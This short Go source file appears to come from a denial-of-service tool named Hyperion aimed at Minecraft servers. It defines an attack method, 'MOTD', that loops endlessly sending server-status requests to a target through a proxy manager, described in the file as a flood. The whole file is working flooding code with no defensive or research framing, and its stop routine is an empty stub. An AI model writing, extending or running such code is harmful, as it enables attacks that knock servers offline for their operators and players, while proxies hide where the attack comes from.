package methods

import (
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
)

type MOTD struct {
	Info         *methods.AttackInfo
	ProxyManager *proxy.ProxyManager
}

func (Method MOTD) Name() string {
	return "MOTD"
}

func (motd MOTD) Description() string {
	return "Joins server and then flood request motd"
}

func (motd *MOTD) Start() {
	go func() {
		for {
			select {
			case <-motd.Info.Stop:
				return
			default:
				motd.ProxyManager.SendMOTDRequest(motd.Info.Target)
			}
		}
	}()
}

func (motd MOTD) Stop() {
	// implementation for stopping the Motd method
}
